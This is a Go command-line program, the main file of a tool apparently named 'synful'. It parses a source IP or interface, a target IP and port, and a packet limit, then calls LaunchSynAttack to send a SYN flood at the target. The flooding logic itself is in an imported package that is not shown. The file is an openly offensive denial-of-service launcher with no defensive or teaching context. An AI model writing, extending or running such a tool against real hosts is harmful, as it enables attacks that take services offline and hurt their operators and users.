package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"time"
	"synful/helpers"
	"synful/syn"
)

func main() {
	var err error
	src := flag.String("src", "", "Source IP (use this or -intf)")
	dst := flag.String("dst", "", "Destination IP")
	dstPort := flag.Int("dstport", 0, "Destination port")
	limit := flag.Int("limit", 0, "Limit packets sent")
	intf := flag.String("i", "", "Network interface to send from (use this or -src)")

	flag.Parse()
	rand.Seed(time.Now().UnixNano())

	srcIP := net.ParseIP(*src).To4()
	dstIP := net.ParseIP(*dst).To4()

	if *src == "" && *intf == "" {
		fmt.Printf("Source IP or Network interface name is required  \n")
		os.Exit(1)
	}

	if dstIP == nil || *dstPort == 0 {
		fmt.Printf("Destination IP and port are required.  \n")
		os.Exit(1)
	}

	if srcIP == nil {
		srcIP, err = helpers.GetInterfaceIpv4(*intf)

		if err != nil {
			fmt.Printf("GetInterfaceIpv4 error: %s \n", err)
			os.Exit(1)
		}
	}

	synattack := syn.SynAttack{}
	synattack.LaunchSynAttack(srcIP, dstIP, *dstPort, *limit)

}
